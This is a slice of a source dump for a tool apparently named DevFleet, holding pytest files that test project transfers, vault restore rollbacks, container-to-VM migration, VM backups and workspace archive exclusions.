# DevFleet source part 101

Full-source UTF-8 byte interval [4650000, 4696500); read in order. This is a contiguous text slice, so a code fence/file may continue across parts.
Payload SHA-256: 872eade2a709da0ac4c243f2bdffdfdf0d75b4c33bea19375d6ffd1473f724e2

<!-- BEGIN SOURCE SLICE -->
       projects.load_authoritative_project_identity_for_mutation(project)
    with pytest.raises(ValueError, match="awaits source finalization"):
        projects.start_project(project.name, override_failover=True)


def test_receive_transfer_rejects_conflicting_existing_project_before_restore(
    monkeypatch, tmp_path
):
    _, project = _canonical_project(monkeypatch, tmp_path, slug="conflict-project")
    metadata_path = project / ".devfleet/project.json"
    metadata = json.loads(metadata_path.read_text())
    metadata["project_id"] = "ffffffff-ffff-4fff-8fff-ffffffffffff"
    metadata_path.write_text(json.dumps(metadata), encoding="utf-8")
    forbidden = lambda *_args, **_kwargs: (_ for _ in ()).throw(
        AssertionError("conflicting destination reached restore")
    )
    monkeypatch.setattr(projects, "_vault_request", forbidden)

    with pytest.raises(ValueError, match="project identity does not match"):
        projects.receive_transferred_project(
            project.name,
            PROJECT_ID,
            DEPLOYMENT_ID,
            "devfleet-primary",
            "devfleet-failover",
        )


def test_receive_transfer_replaces_matching_stopped_destination_transactionally(
    monkeypatch, tmp_path
):
    settings, project = _canonical_project(
        monkeypatch, tmp_path, slug="replace-project"
    )
    settings = replace(settings, quarantine=tmp_path / "quarantine")
    monkeypatch.setattr(projects, "SETTINGS", settings)
    monkeypatch.setattr(main, "SETTINGS", settings)
    (project / "prior-sentinel.txt").write_text("prior", encoding="utf-8")
    staging = (
        settings.workspaces
        / "replace-project-recovered-20260916-123456-deadbeef"
    )
    monkeypatch.setattr(
        projects,
        "run",
        lambda args, **_kwargs: subprocess.CompletedProcess(args, 0, "", ""),
    )

    def restore(*_args, **_kwargs):
        _restore_transfer_fixture(staging, "replace-project")
        return {"ok": True, "target": str(staging)}

    monkeypatch.setattr(projects, "_vault_request", restore)
    result = projects.receive_transferred_project(
        "replace-project",
        PROJECT_ID,
        DEPLOYMENT_ID,
        "devfleet-primary",
        "devfleet-failover",
    )

    prior = Path(result["prior_destination_quarantine"])
    assert result["state"] == "handoff-pending"
    assert prior.is_dir() and (prior / "prior-sentinel.txt").read_text() == "prior"
    assert project.is_dir() and not (project / "prior-sentinel.txt").exists()
    metadata = json.loads((project / ".devfleet/project.json").read_text())
    assert metadata["transfer_state"] == "pending-source-finalization"
    assert projects._transfer_pending_marker_path(project).is_file()


def test_receive_transfer_adoption_failure_rolls_back_source_bound_records(
    monkeypatch, tmp_path
):
    settings = replace(
        projects.SETTINGS,
        workspaces=tmp_path / "workspaces",
        runtime_root=tmp_path / "runtime",
        node_name="devfleet-failover",
        deployment_id=DEPLOYMENT_ID,
    )
    settings.workspaces.mkdir()
    monkeypatch.setattr(projects, "SETTINGS", settings)
    monkeypatch.setattr(
        projects,
        "run",
        lambda args, **_kwargs: subprocess.CompletedProcess(args, 0, "", ""),
    )
    slug = "rollback-transfer"
    project = settings.workspaces / slug
    staging = settings.workspaces / f"{slug}-recovered-20260916-123456-deadbeef"

    def restore(*_args, **_kwargs):
        _restore_transfer_fixture(staging, slug)
        return {"ok": True, "target": str(staging)}

    monkeypatch.setattr(projects, "_vault_request", restore)
    monkeypatch.setattr(
        projects,
        "write_ownership_override",
        lambda *_args, **_kwargs: (_ for _ in ()).throw(
            RuntimeError("ownership override failed")
        ),
    )

    with pytest.raises(RuntimeError, match="ownership override failed"):
        projects.receive_transferred_project(
            slug,
            PROJECT_ID,
            DEPLOYMENT_ID,
            "devfleet-primary",
            "devfleet-failover",
        )

    assert not project.exists()
    assert staging.is_dir()
    metadata = json.loads((staging / ".devfleet/project.json").read_text())
    lease = json.loads((staging / ".devfleet/ownership-lease.json").read_text())
    assert metadata["host_id"] == "devfleet-primary"
    assert lease["active_node"] == "devfleet-primary"
    assert not projects.ownership_override_path(staging).exists()


def test_receive_transfer_api_validates_confirmation_and_queues_exact_task(
    monkeypatch, tmp_path
):
    settings = replace(
        main.SETTINGS,
        workspaces=tmp_path / "workspaces",
        runtime_root=tmp_path / "runtime",
        node_name="devfleet-failover",
        deployment_id=DEPLOYMENT_ID,
    )
    monkeypatch.setattr(main, "SETTINGS", settings)
    queued = []

    def submit(*args, **kwargs):
        queued.append((args, kwargs))
        return "receive-operation"

    monkeypatch.setattr(main, "submit_operation", submit)
    payload = {
        "slug": "received-project",
        "project_id": PROJECT_ID,
        "deployment_id": DEPLOYMENT_ID,
        "source_host_id": "devfleet-primary",
        "destination_host_id": "devfleet-failover",
        "confirm_slug": "received-project",
        "confirm_phrase": "RECEIVE TRANSFER received-project",
    }
    with TestClient(main.app) as client:
        rejected = client.post(
            "/api/transfers/receive",
            headers={"X-DevFleet-Token": "test-token"},
            json={**payload, "confirm_phrase": "RECEIVE TRANSFER wrong"},
        )
        accepted = client.post(
            "/api/transfers/receive",
            headers={"X-DevFleet-Token": "test-token"},
            json=payload,
        )
        activate_rejected = client.post(
            "/api/transfers/activate",
            headers={"X-DevFleet-Token": "test-token"},
            json={**payload, "confirm_phrase": "ACTIVATE TRANSFER wrong"},
        )
        activate_accepted = client.post(
            "/api/transfers/activate",
            headers={"X-DevFleet-Token": "test-token"},
            json={
                **payload,
                "confirm_phrase": "ACTIVATE TRANSFER received-project",
            },
        )

    assert rejected.status_code == 400
    assert accepted.status_code == 202
    assert activate_rejected.status_code == 400
    assert activate_accepted.status_code == 202
    assert len(queued) == 2
    receive_args, receive_kwargs = queued[0]
    activate_args, activate_kwargs = queued[1]
    assert receive_args[:2] == ("receive-transfer", "received-project")
    assert receive_kwargs["project_id"] == PROJECT_ID
    assert activate_args[:2] == ("activate-transfer", "received-project")
    assert activate_kwargs["idempotency_key"].endswith(
        ":devfleet-primary:devfleet-failover"
    )

```


## FILE: source/tests/test_v123_vault_restore_transaction.py

SHA256: d13055a62902cdfe9b0ff6ab24dc8e0e3dab1e3fd79b0a21cda26cc01ee84633 | Bytes: 5814 | Git mode: 100644

```
from __future__ import annotations

import json
import os
from pathlib import Path
import shutil
import subprocess

import pytest


ROOT = Path(__file__).resolve().parents[1]
WINDOWS_GIT_BASH = Path(r"C:\Program Files\Git\bin\bash.exe")
BASH = WINDOWS_GIT_BASH if WINDOWS_GIT_BASH.is_file() else Path(shutil.which("bash") or "")


def unix(path: Path) -> str:
    value = path.resolve().as_posix()
    return "/" + value[0].lower() + value[2:] if value[1:3] == ":/" else value


def executable(path: Path, text: str) -> None:
    path.write_text(text, encoding="utf-8", newline="\n")
    path.chmod(0o755)


@pytest.mark.parametrize("rollback_collision", [False, True])
def test_canonical_promotion_failure_preserves_the_prior_workspace(
    tmp_path: Path, rollback_collision: bool
):
    assert BASH.is_file(), "A Bash runtime is required for the shipped restore transaction test."
    lab = tmp_path / "lab"
    bin_dir = lab / "bin"
    workspaces = lab / "workspaces"
    quarantine = lab / "quarantine"
    for directory in (bin_dir, workspaces, quarantine, lab / "etc", lab / "run"):
        directory.mkdir(parents=True)
    project = "vault-source"
    project_id = "12345678-1234-1234-1234-123456789abc"
    canonical = workspaces / project
    (canonical / ".devfleet").mkdir(parents=True)
    (canonical / "original.txt").write_text("prior-canonical\n", encoding="utf-8")
    (canonical / ".devfleet/project.json").write_text(
        json.dumps(
            {
                "schema_version": 5,
                "managed_by": "devfleet",
                "slug": project,
                "project_id": project_id,
            }
        ),
        encoding="utf-8",
    )
    (lab / "etc/restic.env").write_text("RESTIC_REPOSITORY=test\n", encoding="utf-8")
    (lab / "uuid").write_text("deadbeef-1111-2222-3333-444444444444\n", encoding="utf-8")

    script_text = (ROOT / "linux/devfleet-restore-project").read_text(encoding="utf-8")
    script_text = script_text.replace(
        "set -Eeuo pipefail",
        'set -Eeuo pipefail\nPATH="$DEVFLEET_TEST_BIN:/usr/bin:/bin"',
        1,
    )
    for source, replacement in (
        ("/home/devrunner/.devfleet-quarantine", "${DEVFLEET_TEST_ROOT}/quarantine"),
        ("/home/devrunner/workspaces", "${DEVFLEET_TEST_ROOT}/workspaces"),
        ("/etc/devfleet/restic.env", "${DEVFLEET_TEST_ROOT}/etc/restic.env"),
        ("/run/lock/devfleet-vault-operation.lock", "${DEVFLEET_TEST_ROOT}/run/vault.lock"),
        ("/proc/sys/kernel/random/uuid", "${DEVFLEET_TEST_ROOT}/uuid"),
    ):
        script_text = script_text.replace(source, replacement)
    script = lab / "restore-under-test"
    executable(script, script_text)

    executable(bin_dir / "flock", "#!/usr/bin/env bash\nexit 0\n")
    executable(bin_dir / "python3", "#!/usr/bin/env bash\nexit 0\n")
    executable(
        bin_dir / "jq",
        """#!/usr/bin/env bash
if [[ "$*" == *"--arg slug"* ]]; then
  exit 0
fi
cat >/dev/null
printf 'snap-1\\n'
""",
    )
    executable(
        bin_dir / "restic",
        """#!/usr/bin/env bash
if [[ "${1:-}" == snapshots ]]; then
  printf '[{"id":"snap-1","time":"2026-09-16T00:00:00Z"}]\\n'
  exit 0
fi
target=""
while [[ $# -gt 0 ]]; do
  if [[ "$1" == --target ]]; then target=$2; shift 2; continue; fi
  shift
done
source_dir="$target${DEVFLEET_TEST_ROOT}/workspaces/$PROJECT"
mkdir -p "$source_dir/.devfleet"
printf '{"schema_version":5,"managed_by":"devfleet","slug":"%s","project_id":"%s"}\\n' "$PROJECT" "$PROJECT_ID" >"$source_dir/.devfleet/project.json"
printf 'restored-copy\\n' >"$source_dir/restored.txt"
""",
    )
    executable(
        bin_dir / "mv",
        """#!/usr/bin/env bash
counter="$DEVFLEET_TEST_ROOT/mv-count"
count=0
[[ -f "$counter" ]] && read -r count <"$counter"
count=$((count + 1))
printf '%s\\n' "$count" >"$counter"
if [[ $count -eq 2 ]]; then
  exit 42
fi
if [[ $count -eq 3 && "${ROLLBACK_COLLISION:-0}" == 1 ]]; then
  destination="${@: -1}"
  mkdir -p "$destination"
  printf 'foreign-race\\n' >"$destination/foreign.txt"
fi
exec /usr/bin/mv "$@"
""",
    )

    env = os.environ.copy()
    env.update(
        {
            "DEVFLEET_TEST_ROOT": unix(lab),
            "DEVFLEET_TEST_BIN": unix(bin_dir),
            "PROJECT": project,
            "PROJECT_ID": project_id,
            "ROLLBACK_COLLISION": "1" if rollback_collision else "0",
            "PATH": f"{unix(bin_dir)}:/usr/bin:/bin",
        }
    )
    result = subprocess.run(
        [str(BASH), "--noprofile", "--norc", unix(script), project, project_id, "--canonical"],
        capture_output=True,
        text=True,
        env=env,
        timeout=20,
        check=False,
    )

    assert result.returncode != 0
    quarantined = list(quarantine.glob("transfer-replaced-*"))
    if rollback_collision:
        assert result.returncode == 6
        assert (canonical / "foreign.txt").read_text(encoding="utf-8") == "foreign-race\n"
        assert len(quarantined) == 1
        assert (quarantined[0] / "original.txt").read_text(encoding="utf-8") == "prior-canonical\n"
    else:
        assert (canonical / "original.txt").read_text(encoding="utf-8") == "prior-canonical\n"
        assert not (canonical / "restored.txt").exists()
        assert not quarantined


def test_restore_script_binds_snapshot_to_slug_and_project_id():
    text = (ROOT / "linux/devfleet-restore-project").read_text(encoding="utf-8")
    assert 'python3 -I /opt/devfleet/devfleet/metadata_io.py' in text
    assert '--identity "$workspace" "$project" "$expected_project_id"' in text
    assert '"$expected_deployment_id" "$expected_source_host_id"' in text
    assert 'workspace_identity_matches "$target"' in text
    assert "Canonical restore rollback failed" in text
    assert "rollback did not reach its identity-bound postcondition" in text

```


## FILE: source/tests/test_v124_environment_wizard.py

SHA256: cc35cdd574c4a2e12f84169d3b821030eead1bced0d3f1edcc3d09da6d478e0e | Bytes: 3060 | Git mode: 100644

```
import json
from pathlib import Path

import pytest
from fastapi import HTTPException

from devfleet import main


def _workspace(tmp_path: Path) -> Path:
    project = tmp_path / 'demo'
    (project / '.devfleet').mkdir(parents=True)
    (project / 'compose.yaml').write_text('services: {}\n', encoding='utf-8')
    (project / '.devfleet/project.json').write_text(json.dumps({
        'schema_version': 5,
        'managed_by': 'devfleet',
        'slug': 'demo',
        'identity': 'demo',
        'project_id': '12345678-1234-1234-1234-123456789abc',
        'runtime_isolation': 'container',
        'runtime_provider': 'docker-compose',
        'runtime_id': 'devfleet-demo',
        'host_id': 'test-node',
        'resource_profile': 'standard',
    }), encoding='utf-8')
    return project


def test_preflight_reports_insufficient_selected_capacity(monkeypatch, tmp_path):
    project = _workspace(tmp_path)
    monkeypatch.setattr(main, 'safe_child', lambda *_: project)
    monkeypatch.setattr(main, 'inspect_workspace', lambda *_: {'safe_for_archive': True})
    monkeypatch.setattr(main, 'detect_runtime', lambda *_: {'runtime_type': 'container'})
    monkeypatch.setattr(main, 'get_host_capacity', lambda: {'capacity': {'allocatable_cpus': 8, 'allocatable_memory_gb': 2.5, 'allocatable_disk_gb': 200}})
    monkeypatch.setattr(main, 'project_command_readiness', lambda *_: {'ready': True, 'missing_required': [], 'invalid_required': {}})
    result = main._preflight('demo', 'vm', 'large')
    assert result['inspection_ok'] is True
    assert result['capacity_ready'] is False
    assert result['migration_ready'] is False
    assert result['blockers']


def test_preflight_uses_selected_custom_resources(monkeypatch, tmp_path):
    project = _workspace(tmp_path)
    monkeypatch.setattr(main, 'safe_child', lambda *_: project)
    monkeypatch.setattr(main, 'inspect_workspace', lambda *_: {'safe_for_archive': True})
    monkeypatch.setattr(main, 'detect_runtime', lambda *_: {'runtime_type': 'container'})
    monkeypatch.setattr(main, 'get_host_capacity', lambda: {'capacity': {'allocatable_cpus': 8, 'allocatable_memory_gb': 16, 'allocatable_disk_gb': 200}})
    monkeypatch.setattr(main, 'project_command_readiness', lambda *_: {'ready': True, 'missing_required': [], 'invalid_required': {}})
    result = main._preflight('demo', 'vm', 'custom', '3', '6', '60', 'private', '900')
    assert result['selected_resource_profile'] == 'custom'
    assert result['selected_limits']['memory_gb'] == 6
    assert result['selected_limits']['pids'] == 900
    assert result['migration_ready'] is True


def test_environment_mutation_requires_final_wizard_confirmation(monkeypatch):
    monkeypatch.setattr(main, 'ui', lambda *_: None)
    with pytest.raises(HTTPException, match='Complete the Environment'):
        main.project_environment(object(), 'demo', wizard_confirmed=False, csrf_token='valid')


def test_preset_does_not_submit_custom_values():
    assert main._form_resource_limits('standard', '6', '12', '120', '4096', 'private') is None

```


## FILE: source/tests/test_v124_migration_transaction.py

SHA256: 74c240589060a7fe59d71b6a829689c2564bcaa3a5cba00039060d05546b2ae9 | Bytes: 10484 | Git mode: 100644

```
import json

import pytest

import devfleet.projects as projects
from devfleet.core import SETTINGS


def make_project(slug: str, *, runtime: str, lifecycle: str) -> None:
    project = SETTINGS.workspaces / slug
    (project / '.devfleet').mkdir(parents=True, exist_ok=True)
    (project / 'compose.yaml').write_text('services:\n  app:\n    image: ubuntu:24.04\n', encoding='utf-8')
    (project / '.devfleet' / 'template.json').write_text(json.dumps({
        'start_command': 'docker compose up -d --build',
        'stop_command': 'docker compose down --remove-orphans',
        'restart_command': 'docker compose restart',
        'rebuild_command': 'docker compose build && docker compose up -d',
        'logs_command': 'docker compose logs',
    }), encoding='utf-8')
    metadata = {
        'schema_version': 2, 'managed_by': 'devfleet', 'identity': slug, 'slug': slug, 'project_id': '12345678-1234-1234-1234-123456789abc', 'host_id': SETTINGS.node_name,
        'runtime_isolation': runtime, 'runtime_type': runtime,
        'runtime_provider': 'multipass-host-agent' if runtime == 'vm' else 'docker-compose',
        'runtime_id': f'devfleet-project-{slug}' if runtime == 'vm' else '',
        'lifecycle_status': lifecycle, 'runtime_status': lifecycle,
        'resource_profile': 'small',
    }
    (project / '.devfleet' / 'project.json').write_text(json.dumps(metadata), encoding='utf-8')


@pytest.mark.parametrize(
    ('source', 'target', 'lifecycle'),
    [('container', 'vm', 'running'), ('container', 'vm', 'stopped'), ('vm', 'container', 'running'), ('vm', 'container', 'stopped')],
)
def test_migration_preserves_each_source_lifecycle(monkeypatch: pytest.MonkeyPatch, source: str, target: str, lifecycle: str):
    slug = f'v124-{source}-{target}-{lifecycle}'
    make_project(slug, runtime=source, lifecycle=lifecycle)
    calls: list[str] = []
    monkeypatch.setattr(projects, 'running', lambda _project: lifecycle == 'running')
    monkeypatch.setattr(projects, 'backup_project', lambda _slug: json.dumps({'backup_status': 'verified'}))
    monkeypatch.setattr(projects, 'get_host_capacity', lambda: {'capacity': {'allocatable_cpus': 8, 'allocatable_memory_gb': 24, 'allocatable_disk_gb': 300}})
    monkeypatch.setattr(projects, 'sync_project_vm_ssh_alias', lambda *args, **kwargs: {'ok': True})
    monkeypatch.setattr(projects.VmRuntimeOperations, 'ensure', staticmethod(lambda _slug, _meta: {'runtime_id': f'devfleet-project-{slug}', 'address': '10.0.0.1'}))
    monkeypatch.setattr(projects.VmRuntimeOperations, 'start', staticmethod(lambda value, _meta: calls.append(f'vm-start:{value}') or {'runtime_id': f'devfleet-project-{value}'}))
    monkeypatch.setattr(projects.VmRuntimeOperations, 'stop', staticmethod(lambda value, _meta: calls.append(f'vm-stop:{value}') or {'state': 'stopped'}))
    monkeypatch.setattr(projects, 'import_project_workspace', lambda *args, **kwargs: {'workspace_preserved': True, 'source_archive_sha256': 'a' * 64, 'target_archive_sha256': 'a' * 64})
    monkeypatch.setattr(projects.VM_RUNTIME, 'export_to_source', lambda *args, **kwargs: {'state': 'verified', 'workspace_path': f'/home/devrunner/workspaces/{slug}', 'previous_workspace_path': f'/home/devrunner/workspaces/{slug}-before-vm-export-0123456789abcdef0123456789abcdef'})

    def start(value: str) -> str:
        calls.append(f'start:{value}')
        project = SETTINGS.workspaces / value
        meta = projects.load_meta(project)
        meta.update({'lifecycle_status': 'running', 'runtime_status': 'running', 'health_status': 'healthy'})
        projects.atomic_json(projects.metadata_path(project), meta)
        return 'started'

    monkeypatch.setattr(projects, 'start_project', start)
    monkeypatch.setattr(projects, 'stop_project', lambda value: calls.append(f'stop:{value}') or 'stopped')
    monkeypatch.setattr(projects, 'runtime_health', lambda _slug: {'ok': True, 'healthy': True})
    monkeypatch.setattr(projects, 'health_project', lambda _slug: 'healthy')

    result = projects.assign_project_runtime(slug, target, 'small')
    saved = projects.load_meta(SETTINGS.workspaces / slug)

    assert saved['lifecycle_status'] == ('running' if lifecycle == 'running' else 'stopped')
    assert result['application_health'] == ('healthy' if lifecycle == 'running' else 'not-run-stopped')
    assert any(item.startswith('start:') for item in calls) is (lifecycle == 'running')
    assert any(item.startswith('vm-start:') for item in calls) is (source == 'vm' and lifecycle == 'stopped')
    assert any(item.startswith('vm-stop:') for item in calls) is (source == 'container' and target == 'vm' and lifecycle == 'stopped')
    if source == 'vm' and target == 'container':
        assert saved['previous_environment']['runtime_id'] == f'devfleet-project-{slug}'
        assert saved['previous_environment']['previous_workspace_path'].endswith('0123456789abcdef0123456789abcdef')


def test_schema2_migration_uses_real_backup_then_enables_strict_runtime_action(
    monkeypatch: pytest.MonkeyPatch,
):
    slug = 'v124-schema2-upgrade'
    make_project(slug, runtime='container', lifecycle='stopped')
    monkeypatch.setattr(projects, 'running', lambda _project: False)
    monkeypatch.setattr(
        projects,
        'detect_runtime',
        lambda _slug: {
            'runtime_isolation': 'container',
            'runtime_provider': 'docker-compose',
        },
    )
    monkeypatch.setattr(
        projects,
        '_vault_request',
        lambda action, *args, **kwargs: {
            'ok': True,
            'action': action,
            'local_backup_status': 'verified',
            'vault_upload_status': 'verified',
            'durability_level': 'vault',
        },
    )

    result = projects.assign_project_runtime(slug, 'container', 'small')
    project = SETTINGS.workspaces / slug
    saved = json.loads((project / '.devfleet/project.json').read_text(encoding='utf-8'))
    inspected = projects.inspect_runtime(slug)

    assert result['backup_status'] == 'verified'
    assert saved['schema_version'] == 5
    assert saved['deployment_id'] == SETTINGS.deployment_id
    assert saved['runtime_id'] == projects.compose_name(slug)
    assert saved['backup_status'] == 'verified'
    assert inspected['ok'] is True and inspected['running'] is False
    snapshots = sorted(
        (SETTINGS.runtime_root / 'runtime-migrations').glob(f'{slug}-*.json')
    )
    assert snapshots
    migration = json.loads(snapshots[-1].read_text(encoding='utf-8'))
    assert migration['backup_status'] == 'verified-local-and-vault'
    assert migration['backup_artifact']['sha256']


def test_vm_to_container_failure_restores_retained_workspace_and_running_vm(monkeypatch: pytest.MonkeyPatch):
    slug = 'v124-rollback-vm'
    make_project(slug, runtime='vm', lifecycle='running')
    restored: list[dict] = []
    calls: list[str] = []
    monkeypatch.setattr(projects, 'backup_project', lambda _slug: json.dumps({'backup_status': 'verified'}))
    monkeypatch.setattr(projects, 'sync_project_vm_ssh_alias', lambda *args, **kwargs: {'ok': True})
    monkeypatch.setattr(projects.VM_RUNTIME, 'export_to_source', lambda *args, **kwargs: {'state': 'verified', 'workspace_path': f'/home/devrunner/workspaces/{slug}', 'previous_workspace_path': f'/home/devrunner/workspaces/{slug}-before-vm-export-0123456789abcdef0123456789abcdef'})
    monkeypatch.setattr(projects.VM_RUNTIME, 'restore_previous_source', lambda *args, **kwargs: restored.append(kwargs) or {'state': 'restored'})
    monkeypatch.setattr(
        projects.VmRuntimeOperations,
        'start',
        staticmethod(lambda value, _meta: calls.append(f'vm-rollback-start:{value}') or {'state': 'running'}),
    )
    monkeypatch.setattr(projects, 'stop_project', lambda value: calls.append(f'stop:{value}') or 'stopped')
    attempts = {'count': 0}
    def start(value: str) -> str:
        attempts['count'] += 1; calls.append(f'start:{value}')
        if attempts['count'] == 1: raise RuntimeError('destination start failed')
        return 'restored'
    monkeypatch.setattr(projects, 'start_project', start)

    with pytest.raises(RuntimeError, match='destination start failed'):
        projects.assign_project_runtime(slug, 'container', 'small')

    assert restored and restored[0]['previous_workspace_path'].endswith('0123456789abcdef0123456789abcdef')
    assert calls.count(f'start:{slug}') == 1
    assert calls.count(f'vm-rollback-start:{slug}') == 1


def test_schema2_vault_failure_restores_exact_metadata_before_any_runtime_action(
    monkeypatch: pytest.MonkeyPatch,
):
    slug = 'v124-schema2-vault-rollback'
    make_project(slug, runtime='container', lifecycle='stopped')
    project = SETTINGS.workspaces / slug
    metadata_path = project / '.devfleet/project.json'
    before = metadata_path.read_bytes()
    monkeypatch.setattr(projects, 'running', lambda _project: False)
    monkeypatch.setattr(
        projects,
        'backup_project',
        lambda _slug: (_ for _ in ()).throw(RuntimeError('vault unavailable')),
    )
    monkeypatch.setattr(
        projects,
        'start_project',
        lambda *_args, **_kwargs: (_ for _ in ()).throw(
            AssertionError('stopped source must not be started during rollback')
        ),
    )
    monkeypatch.setattr(
        projects,
        'stop_project',
        lambda *_args, **_kwargs: (_ for _ in ()).throw(
            AssertionError('stopped source must not be stopped during rollback')
        ),
    )

    with pytest.raises(RuntimeError, match='vault unavailable'):
        projects.assign_project_runtime(slug, 'container', 'small')

    assert metadata_path.read_bytes() == before
    restored = json.loads(metadata_path.read_text(encoding='utf-8'))
    assert restored['schema_version'] == 2


def test_local_migration_restore_rejects_archive_hash_drift(
    monkeypatch: pytest.MonkeyPatch, tmp_path
):
    archive = tmp_path / 'migration.workspace.tar.gz'
    archive.write_bytes(b'tampered archive')
    monkeypatch.setattr(
        projects,
        'restore_workspace_archive',
        lambda *_args, **_kwargs: (_ for _ in ()).throw(
            AssertionError('unverified migration archive reached restore')
        ),
    )

    with pytest.raises(ValueError, match='SHA-256 mismatch'):
        projects._restore_local_migration_backup(
            tmp_path / 'project',
            'v124-hash-check',
            {'path': str(archive), 'sha256': '0' * 64},
        )

```


## FILE: source/tests/test_v124_vm_backups.py

SHA256: 635be7cf6db6bcc88cbae397e782da8c586aef63d6824ad0f3bc6bcf2959fb48 | Bytes: 3936 | Git mode: 100644

```
import tarfile
from pathlib import Path

import pytest

from devfleet import projects
from devfleet.core import SETTINGS, atomic_json
from devfleet.workspace_archives import create_workspace_archive


ROOT = Path(__file__).resolve().parents[1]


def _vm_project(slug: str) -> Path:
    project = SETTINGS.workspaces / slug
    (project / ".devfleet").mkdir(parents=True, exist_ok=True)
    atomic_json(project / ".devfleet/project.json", {
        "schema_version": 3,
        "managed_by": "devfleet",
        "project_id": "11111111-1111-1111-1111-111111111111",
        "slug": slug,
        "host_id": "test-node",
        "runtime_isolation": "vm",
        "runtime_provider": "multipass-host-agent",
        "runtime_id": f"devfleet-project-{slug}",
    })
    return project


def test_vm_backup_history_uses_host_provider(monkeypatch):
    slug = "v124-vm-history"
    project = _vm_project(slug)
    expected = [{"backup_id": "v124-vm-history-20260810-000000-deadbeef", "provider": "multipass-host-agent", "restore_eligible": True}]
    monkeypatch.setattr(projects.VM_RUNTIME, "list_backups", lambda selected, metadata: expected)
    try:
        assert projects.list_backups(slug) == expected
    finally:
        import shutil
        shutil.rmtree(project, ignore_errors=True)


def test_vm_restore_requires_deliberate_overwrite_confirmation(monkeypatch):
    slug = "v124-vm-restore"
    project = _vm_project(slug)
    called = []
    monkeypatch.setattr(projects.VM_RUNTIME, "restore_backup", lambda selected, metadata, backup_id, confirm_restore=False: called.append((backup_id, confirm_restore)) or {"backup_sha256": "a" * 64})
    try:
        with pytest.raises(ValueError, match="overwrite confirmation"):
            projects.restore_backup(slug, "v124-vm-restore-20260810-000000-deadbeef", confirm_restore=True, allow_overwrite=False)
        result = projects.restore_backup(slug, "v124-vm-restore-20260810-000000-deadbeef", confirm_restore=True, allow_overwrite=True)
        assert result["provider"] == "multipass-host-agent"
        assert called == [("v124-vm-restore-20260810-000000-deadbeef", True)]
    finally:
        import shutil
        shutil.rmtree(project, ignore_errors=True)


def test_generated_symlink_directory_is_excluded_from_workspace_archive(tmp_path):
    slug = "generated-exclusion"
    workspace = tmp_path / slug
    (workspace / ".devfleet").mkdir(parents=True)
    (workspace / ".devfleet/project.json").write_text('{"project_id":"11111111-1111-1111-1111-111111111111"}', encoding="utf-8")
    (workspace / "src").mkdir()
    (workspace / "src/main.js").write_text("console.log('ok')", encoding="utf-8")
    generated_bin = workspace / "node_modules/.bin"
    generated_bin.mkdir(parents=True)
    target = workspace / "node_modules/tool.js"
    target.write_text("generated", encoding="utf-8")
    try:
        (generated_bin / "tool").symlink_to(target)
    except OSError:
        pytest.skip("Symlink creation is unavailable on this platform")
    archive = tmp_path / "workspace.tar.gz"
    result = create_workspace_archive(workspace, slug, archive)
    assert "node_modules" in result["generated_dirs"]
    with tarfile.open(archive, "r:gz") as handle:
        names = handle.getnames()
    assert f"{slug}/src/main.js" in names
    assert not any("node_modules" in name for name in names)


def test_host_agent_backup_and_export_share_generated_directory_exclusions():
    source = (ROOT / "windows/DevFleet-HostAgent.ps1").read_text(encoding="utf-8")
    assert "function New-VerifiedRemoteWorkspaceArchive" in source
    assert 'excluded = {"node_modules", ".next", "build", "dist", ".venv", "venv", ".pytest_cache", "__pycache__", ".test-runtime"}' in source
    assert source.count("New-VerifiedRemoteWorkspaceArchive $Record.vm_name $remoteArchive") >= 2
    assert all(operation in source for operation in ("'list-backups'", "'inspect-backup'", "'restore-backup'"))

```


## FILE: source/tests/test_v124_vm_creation_ssh.py

SHA256: 705b439b834162d0890b8b4b4bb42ed66dc300e76b409de537520323dd8ebe6c | Bytes: 6592 | Git mode: 100644

```
import json
import shutil
import uuid
from pathlib import Path

import pytest

import devfleet.projects as projects
from devfleet.core import SETTINGS


def _template(project: Path, _name: str) -> None:
    control = project / ".devfleet"
    control.mkdir(parents=True, exist_ok=True)
    (control / "template.json").write_text(json.dumps({
        "bootstrap_command": "./.devfleet/bootstrap.sh",
        "health_command": "./.devfleet/health-check.sh",
        "test_command": "./.devfleet/smoke-test.sh",
    }), encoding="utf-8")


def _template_metadata(_name: str) -> dict:
    return {"language": "python", "framework": "fastapi", "language_rationale": "test", "template_maturity": "stable"}


def _prepare(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(projects, "_copy_template", _template)
    monkeypatch.setattr(projects, "template_metadata", _template_metadata)


def test_vm_create_returns_coherent_metadata_and_syncs_host_alias(monkeypatch: pytest.MonkeyPatch):
    slug = f"v124-vm-create-{uuid.uuid4().hex[:8]}"
    shutil.rmtree(SETTINGS.workspaces / slug, ignore_errors=True)
    _prepare(monkeypatch)
    calls: list[tuple] = []
    runtime_id = f"devfleet-project-{slug}"
    monkeypatch.setattr(projects.VmRuntimeOperations, "ensure", staticmethod(lambda _slug, _meta: {"runtime_id": runtime_id, "address": "10.0.0.44", "state": "ready"}))
    monkeypatch.setattr(projects, "import_project_workspace", lambda *_args, **_kwargs: {"ok": True, "workspace_preserved": True, "address": "10.0.0.44"})
    monkeypatch.setattr(projects, "sync_project_vm_ssh_alias", lambda slug, runtime_id, *, project_id: calls.append((slug, runtime_id, project_id)) or {"validated": True})

    result = projects.create_project(slug, template="generic", runtime_isolation="vm", use_ollama=False)

    for key in ("project_id", "slug", "runtime_isolation", "runtime_provider", "runtime_id", "runtime_address", "ssh_alias", "workspace_host", "workspace_path", "resource_profile", "resource_limits", "provisioning_status", "lifecycle_status", "health_status", "health_scope"):
        assert key in result
    assert result["runtime_isolation"] == "vm"
    assert result["runtime_provider"] == "multipass-host-agent"
    assert result["runtime_id"] == result["ssh_alias"] == runtime_id
    assert result["runtime_address"] == result["workspace_host"] == "10.0.0.44"
    assert result["provisioning_status"] == result["lifecycle_status"] == "ready"
    assert result["health_status"] == "unknown"
    assert result["health_scope"] == "workspace-ready-not-app-healthy"
    assert calls == [(slug, result["runtime_id"], result["project_id"])]
    shutil.rmtree(SETTINGS.workspaces / slug, ignore_errors=True)


def test_container_create_returns_metadata(monkeypatch: pytest.MonkeyPatch):
    slug = f"v124-container-create-{uuid.uuid4().hex[:8]}"
    shutil.rmtree(SETTINGS.workspaces / slug, ignore_errors=True)
    _prepare(monkeypatch)

    result = projects.create_project(slug, template="generic", runtime_isolation="container", use_ollama=False)

    assert isinstance(result, dict)
    assert result["slug"] == slug
    assert result["runtime_isolation"] == "container"
    assert result["runtime_provider"] == "docker-compose"
    assert result["provisioning_status"] == result["lifecycle_status"] == "ready"
